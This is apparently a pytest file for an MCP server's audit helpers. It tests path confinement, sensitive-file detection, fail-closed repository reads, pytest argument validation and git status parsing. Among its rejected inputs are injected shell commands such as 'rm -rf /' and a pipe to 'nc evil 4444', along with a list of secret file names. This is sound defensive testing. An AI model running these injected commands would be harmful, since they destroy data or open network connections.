"""Tests for audit helpers, including scoped-read fail-closed contracts.

Covers path utility safety, sensitive-name recognition, pytest argument validation,
and ensures read/list helpers do not disclose repository content without a verified
scoped-read authority. Tests are source-only in this phase and have not been run.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from iabv_v15.infra.mcp import audit_tools
from iabv_v15.infra.mcp.audit_tools import (
    AuditToolError,
    SubprocessResult,
    capture_ui_screenshot,
    git_status_and_log,
    is_sensitive_path,
    list_repo_directory,
    read_repo_file,
    resolve_workspace_path,
    run_pytest,
    validate_pytest_executable,
    validate_pytest_keyword,
    validate_pytest_suite,
)


# ----------------------------------------------------------------------
# resolve_workspace_path / is_sensitive_path


def test_resolve_workspace_path_accepts_subpath(tmp_path: Path) -> None:
    (tmp_path / "docs").mkdir()
    target = tmp_path / "docs" / "file.md"
    target.write_text("x")
    resolved = resolve_workspace_path(tmp_path, "docs/file.md")
    assert resolved == target.resolve()


def test_resolve_workspace_path_rejects_absolute(tmp_path: Path) -> None:
    with pytest.raises(AuditToolError) as exc:
        resolve_workspace_path(tmp_path, "/etc/passwd")
    assert exc.value.code == "absolute_path_forbidden"


def test_resolve_workspace_path_rejects_leading_slash_on_windows_like(tmp_path: Path) -> None:
    """En Windows ``Path("/etc/passwd").is_absolute()`` devuelve False porque
    el path no trae drive letter; aun así, el guard debe tratarlo como intento
    de escape del workspace y devolver ``absolute_path_forbidden``.
    """
    # Simulamos el comportamiento en ambas plataformas: un path que arranca con
    # "/" o "\" debe rechazarse igualmente con el mismo error code.
    for candidate in ("/etc/passwd", "/usr/bin/python", "\\windows\\system32"):
        with pytest.raises(AuditToolError) as exc:
            resolve_workspace_path(tmp_path, candidate)
        assert exc.value.code == "absolute_path_forbidden", (
            f"expected 'absolute_path_forbidden' for {candidate!r}, "
            f"got {exc.value.code!r}"
        )


def test_resolve_workspace_path_rejects_parent_traversal(tmp_path: Path) -> None:
    with pytest.raises(AuditToolError) as exc:
        resolve_workspace_path(tmp_path, "../outside")
    assert exc.value.code == "parent_traversal_forbidden"


def test_resolve_workspace_path_rejects_symlink_to_outside(tmp_path: Path) -> None:
    # Un symlink que apunta fuera del workspace debe rechazarse tras
    # `resolve()` — este guard cubre el caso en que alguien coloca un link
    # "amigable" dentro del repo que escapa por el realpath.
    outside = tmp_path.parent / "other_workspace_outside"
    outside.mkdir(exist_ok=True)
    sym = tmp_path / "link"
    sym.symlink_to(outside)
    with pytest.raises(AuditToolError) as exc:
        resolve_workspace_path(tmp_path, "link")
    assert exc.value.code == "outside_workspace"


@pytest.mark.parametrize(
    "name",
    [
        ".env",
        ".env.local",
        ".env.production",
        "credentials.json",
        "credentials.backup.json",
        "id_rsa",
        "id_rsa.pub",
        "deploy.key",
        "server.pem",
        "mcp_bridge.json",
    ],
)
def test_is_sensitive_path_flags_known_secrets(name: str) -> None:
    assert is_sensitive_path(name) is True
    assert is_sensitive_path(f"config/{name}") is True


def test_is_sensitive_path_ignores_regular_files() -> None:
    assert is_sensitive_path("README.md") is False
    assert is_sensitive_path("src/iabv_v15/bootstrap.py") is False
    assert is_sensitive_path("tests/test_mcp_server.py") is False


# ----------------------------------------------------------------------
# read_repo_file / list_repo_directory — fail-closed until authority is wired

def test_read_repo_file_denied_even_for_existing_file_without_scoped_authority(tmp_path: Path) -> None:
    target = tmp_path / "note.md"
    target.write_text("must-not-be-disclosed", encoding="utf-8")
    with pytest.raises(AuditToolError) as exc:
        read_repo_file(tmp_path, "note.md")
    assert exc.value.code == "scoped_read_authority_unavailable"
    assert "must-not-be-disclosed" not in exc.value.detail


def test_read_repo_file_denied_before_path_resolution(tmp_path: Path) -> None:
    with pytest.raises(AuditToolError) as exc:
        read_repo_file(tmp_path, "../outside.txt")
    assert exc.value.code == "scoped_read_authority_unavailable"


def test_list_repo_directory_denied_even_for_existing_directory(tmp_path: Path) -> None:
    (tmp_path / "secret-name").write_text("x", encoding="utf-8")
    with pytest.raises(AuditToolError) as exc:
        list_repo_directory(tmp_path, "")
    assert exc.value.code == "scoped_read_authority_unavailable"
    assert "secret-name" not in exc.value.detail


def test_list_repo_directory_denied_before_path_resolution(tmp_path: Path) -> None:
    with pytest.raises(AuditToolError) as exc:
        list_repo_directory(tmp_path, "../outside")
    assert exc.value.code == "scoped_read_authority_unavailable"


# ----------------------------------------------------------------------
# validate_pytest_suite / keyword


@pytest.mark.parametrize(
    "value,expected",
    [
        (None, "tests/"),
        ("", "tests/"),
        ("tests/", "tests/"),
        ("tests/ui", "tests/ui"),
        ("tests/ui/", "tests/ui/"),
        ("tests/test_mcp_server.py", "tests/test_mcp_server.py"),
        ("tests/ui/test_foo.py", "tests/ui/test_foo.py"),
    ],
)
def test_validate_pytest_suite_accepts(value: str | None, expected: str) -> None:
    assert validate_pytest_suite(value) == expected


@pytest.mark.parametrize(
    "value",
    [
        "/tmp/evil",
        "../etc",
        "src/",  # fuera de tests
        "tests/../outside",
        "tests/; rm -rf /",
    ],
)
def test_validate_pytest_suite_rejects(value: str) -> None:
    with pytest.raises(AuditToolError):
        validate_pytest_suite(value)


def test_validate_pytest_keyword_allows_and_rejects() -> None:
    assert validate_pytest_keyword(None) is None
    assert validate_pytest_keyword("") is None
    assert validate_pytest_keyword("foo and not bar") == "foo and not bar"
    with pytest.raises(AuditToolError):
        validate_pytest_keyword("foo`rm -rf`")


def test_validate_pytest_executable_none_and_empty() -> None:
    assert validate_pytest_executable(None) is None
    assert validate_pytest_executable("") is None
    assert validate_pytest_executable("   ") is None


def test_validate_pytest_executable_accepts_real_python(tmp_path: Path) -> None:
    fake = tmp_path / "python3.11"
    fake.write_text("#!/bin/sh\nexit 0\n")
    fake.chmod(0o755)
    assert validate_pytest_executable(str(fake)) == str(fake.resolve())


def test_validate_pytest_executable_accepts_windows_style(tmp_path: Path) -> None:
    fake = tmp_path / "python.exe"
    fake.write_text("binary")
    assert validate_pytest_executable(str(fake)) == str(fake.resolve())


def test_validate_pytest_executable_rejects_missing(tmp_path: Path) -> None:
    missing = tmp_path / "nope" / "python"
    with pytest.raises(AuditToolError) as exc:
        validate_pytest_executable(str(missing))
    assert exc.value.code == "invalid_python_executable"


def test_validate_pytest_executable_rejects_non_python_binary(tmp_path: Path) -> None:
    fake = tmp_path / "bash"
    fake.write_text("#!/bin/sh\n")
    fake.chmod(0o755)
    with pytest.raises(AuditToolError) as exc:
        validate_pytest_executable(str(fake))
    assert exc.value.code == "invalid_python_executable"


@pytest.mark.parametrize(
    "payload",
    [
        "/usr/bin/python3; rm -rf /",
        "/usr/bin/python3 && echo pwned",
        "/usr/bin/python3 | nc evil 4444",
        "/usr/bin/python3\nls",
        "$(echo python)",
        "`echo python`",
    ],
)
def test_validate_pytest_executable_rejects_shell_metachars(payload: str) -> None:
    with pytest.raises(AuditToolError) as exc:
        validate_pytest_executable(payload)
    assert exc.value.code == "invalid_python_executable"


# ----------------------------------------------------------------------
# run_pytest


class _StubRunner:
    def __init__(self, result: SubprocessResult) -> None:
        self.result = result
        self.calls: list[dict[str, Any]] = []

    def __call__(
        self,
        *,
        cmd: list[str],
        cwd: str,
        env: dict[str, str],
        timeout_s: float,
    ) -> SubprocessResult:
        self.calls.append({"cmd": cmd, "cwd": cwd, "env": env, "timeout_s": timeout_s})
        return self.result


def _make_fake_python(tmp_path: Path, name: str = "python3") -> Path:
    fake = tmp_path / name
    fake.write_text("#!/bin/sh\nexit 0\n")
    fake.chmod(0o755)
    return fake.resolve()


def test_run_pytest_default_suite_passes_expected_cmd(tmp_path: Path) -> None:
    fake_python = _make_fake_python(tmp_path)
    runner = _StubRunner(
        SubprocessResult(
            returncode=0,
            stdout="24 passed in 1.20s\n",
            stderr="",
            duration_s=1.2,
        )
    )
    payload = run_pytest(
        tmp_path,
        runner=runner,
        python_executable=str(fake_python),
    )
    assert payload["suite"] == "tests/"
    assert payload["keyword"] is None
    assert payload["passed"] == 24
    assert payload["failed"] == 0
    assert payload["errors"] == 0
    assert payload["returncode"] == 0
    assert payload["timed_out"] is False
    assert "24 passed" in payload["output_tail"]
    # cmd esperado
    call = runner.calls[0]
    assert call["cmd"] == [
        str(fake_python),
        "-m",
        "pytest",
        "-p",
        "no:cacheprovider",
        "tests/",
        "-q",
    ]
    assert call["cwd"] == str(tmp_path.resolve())
    # PYTHONPATH injecta src/
    assert str((tmp_path / "src").resolve()) in call["env"]["PYTHONPATH"]


def test_run_pytest_appends_keyword(tmp_path: Path) -> None:
    fake_python = _make_fake_python(tmp_path)
    runner = _StubRunner(
        SubprocessResult(returncode=1, stdout="0 passed, 1 failed", stderr="", duration_s=0.5)
    )
    payload = run_pytest(
        tmp_path,
        suite="tests/test_mcp_server.py",
        keyword="governance",
        runner=runner,
        python_executable=str(fake_python),
    )
    assert "-k" in runner.calls[0]["cmd"]
    idx = runner.calls[0]["cmd"].index("-k")
    assert runner.calls[0]["cmd"][idx + 1] == "governance"
    assert payload["passed"] == 0
    assert payload["failed"] == 1
    assert payload["returncode"] == 1


def test_run_pytest_invalid_suite_raises(tmp_path: Path) -> None:
    runner = _StubRunner(SubprocessResult(returncode=0, stdout="", stderr="", duration_s=0.0))
    with pytest.raises(AuditToolError) as exc:
        run_pytest(tmp_path, suite="../evil", runner=runner)
    assert exc.value.code == "invalid_suite"
    assert runner.calls == []


def test_run_pytest_timeout_flag(tmp_path: Path) -> None:
    fake_python = _make_fake_python(tmp_path)
    runner = _StubRunner(
        SubprocessResult(
            returncode=-1,
            stdout="collected 0 items\n",
            stderr="",
            duration_s=60.0,
            timed_out=True,
        )
    )
    payload = run_pytest(tmp_path, runner=runner, python_executable=str(fake_python))
    assert payload["timed_out"] is True


def test_run_pytest_rejects_invalid_python_executable(tmp_path: Path) -> None:
    runner = _StubRunner(
        SubprocessResult(returncode=0, stdout="", stderr="", duration_s=0.0)
    )
    with pytest.raises(AuditToolError) as exc:
        run_pytest(
            tmp_path,
            runner=runner,
            python_executable="/usr/bin/python3; rm -rf /",
        )
    assert exc.value.code == "invalid_python_executable"
    assert runner.calls == []


def test_run_pytest_falls_back_to_sys_executable_when_env_var_invalid(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Si `IABV_PYTEST_PYTHON` trae basura, `run_pytest` cae silenciosamente
    a ``sys.executable`` en lugar de abortar con `invalid_python_executable`.

    Regresión de la finding Devin Review
    BUG_pr-review-job-650831194161419eba7d61e5be55a06e_0001:
    el `or` chain original propagaba la `AuditToolError` de la validación
    de la env var sin permitir el fallback.
    """

    import sys as _sys

    monkeypatch.setenv("IABV_PYTEST_PYTHON", "/no/existe/python; rm -rf /")
    runner = _StubRunner(
        SubprocessResult(returncode=0, stdout="24 passed", stderr="", duration_s=0.1)
    )
    payload = run_pytest(tmp_path, runner=runner)
    assert payload["returncode"] == 0
    assert runner.calls[0]["cmd"][0] == _sys.executable


# ----------------------------------------------------------------------
# capture_ui_screenshot


class _FakeProvider:
    def __init__(self, data: bytes) -> None:
        self.data = data
        self.calls: list[str] = []

    def capture(self, region: str) -> bytes:
        self.calls.append(region)
        return self.data


def test_capture_ui_screenshot_with_provider_returns_base64() -> None:
    provider = _FakeProvider(b"\x89PNGDATA")
    payload = capture_ui_screenshot(provider, region="control_center")
    assert payload["region"] == "control_center"
    assert payload["format"] == "png"
    assert payload["size_bytes"] == len(b"\x89PNGDATA")
    assert "bytes_base64" in payload
    assert provider.calls == ["control_center"]


def test_capture_ui_screenshot_without_provider_degrades() -> None:
    payload = capture_ui_screenshot(None)
    assert payload["error"] == "ui_not_running"
    assert payload["region"] == "control_center"


def test_capture_ui_screenshot_empty_bytes_degrades() -> None:
    payload = capture_ui_screenshot(_FakeProvider(b""), region="evolution")
    assert payload["error"] == "ui_not_running"
    assert payload["region"] == "evolution"


# ----------------------------------------------------------------------
# git_status_and_log


_LOG_FIELD_SEP = "\x1f"
_LOG_RECORD_SEP = "\x1e"


class _GitScriptRunner:
    """Runner que responde según el subcomando git ejecutado."""

    def __init__(self, responses: dict[str, SubprocessResult]) -> None:
        self.responses = responses
        self.calls: list[list[str]] = []

    def __call__(
        self,
        *,
        cmd: list[str],
        cwd: str,
        env: dict[str, str],
        timeout_s: float,
    ) -> SubprocessResult:
        self.calls.append(list(cmd))
        # mapear por segunda palabra del comando git
        if len(cmd) >= 2:
            key = cmd[1]
        else:
            key = ""
        if key in self.responses:
            return self.responses[key]
        return SubprocessResult(returncode=1, stdout="", stderr="unknown", duration_s=0.0)


def _commit_record(sha: str, short: str, author: str, date: str, msg: str) -> str:
    return _LOG_FIELD_SEP.join([sha, short, author, date, msg]) + _LOG_RECORD_SEP


def test_git_status_and_log_happy_path(tmp_path: Path) -> None:
    porcelain = (
        "## devin/1234-audit...origin/main [ahead 2, behind 1]\n"
        " M src/iabv_v15/infra/mcp/server.py\n"
        "?? tests/test_mcp_audit_tools.py\n"
    )
    log_out = _commit_record(
        "abcd1234ef567890abcd1234ef567890abcd1234",
        "abcd123",
        "Jhovanny <j@example.com>",
        "2026-04-19T10:00:00-03:00",
        "feat(audit): add audit tools",
    ) + _commit_record(
        "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
        "deadbee",
        "Devin <d@example.com>",
        "2026-04-18T22:00:00-03:00",
        "test(audit): coverage",
    )
    runner = _GitScriptRunner(
        {
            "rev-parse": SubprocessResult(returncode=0, stdout="true\n", stderr="", duration_s=0.01),
            "status": SubprocessResult(returncode=0, stdout=porcelain, stderr="", duration_s=0.02),
            "log": SubprocessResult(returncode=0, stdout=log_out, stderr="", duration_s=0.03),
        }
    )
    payload = git_status_and_log(tmp_path, limit=2, runner=runner)
    assert payload["branch"] == "devin/1234-audit"
    assert payload["ahead"] == 2
    assert payload["behind"] == 1
    assert payload["dirty_count"] == 2
    assert {f["path"] for f in payload["dirty_files"]} == {
        "src/iabv_v15/infra/mcp/server.py",
        "tests/test_mcp_audit_tools.py",
    }
    assert len(payload["last_commits"]) == 2
    assert payload["last_commits"][0]["short_sha"] == "abcd123"
    assert payload["last_commits"][0]["message"] == "feat(audit): add audit tools"


def test_git_status_and_log_not_a_repo(tmp_path: Path) -> None:
    runner = _GitScriptRunner(
        {
            "rev-parse": SubprocessResult(
                returncode=128,
                stdout="",
                stderr="fatal: not a git repository",
                duration_s=0.0,
            ),
        }
    )
    payload = git_status_and_log(tmp_path, runner=runner)
    assert payload["error"] == "not_a_git_repo"
    assert "fatal" in payload["detail"]


def test_git_status_and_log_caps_limit(tmp_path: Path) -> None:
    runner = _GitScriptRunner(
        {
            "rev-parse": SubprocessResult(returncode=0, stdout="true\n", stderr="", duration_s=0.01),
            "status": SubprocessResult(returncode=0, stdout="## main\n", stderr="", duration_s=0.0),
            "log": SubprocessResult(returncode=0, stdout="", stderr="", duration_s=0.0),
        }
    )
    git_status_and_log(tmp_path, limit=10_000, runner=runner)
    log_cmd = runner.calls[-1]
    # -n<limit> capeado a MAX_GIT_LOG_LIMIT
    assert any(part == f"-n{audit_tools.MAX_GIT_LOG_LIMIT}" for part in log_cmd)
